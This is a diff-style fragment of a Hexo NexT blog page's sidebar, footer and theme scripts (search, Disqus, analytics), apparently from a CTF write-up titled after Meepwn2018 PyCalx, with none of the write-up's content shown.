+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findneo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PyCalx"><span class="nav-number">1.</span> <span class="nav-text">PyCalx</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PyCalx2"><span class="nav-number">2.</span> <span class="nav-text">PyCalx2</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://findneo.github.io/180719MeePwn_py3Inject/';
+          this.page.identifier = '180719MeePwn_py3Inject/';
+          this.page.title = 'Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://findneo.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
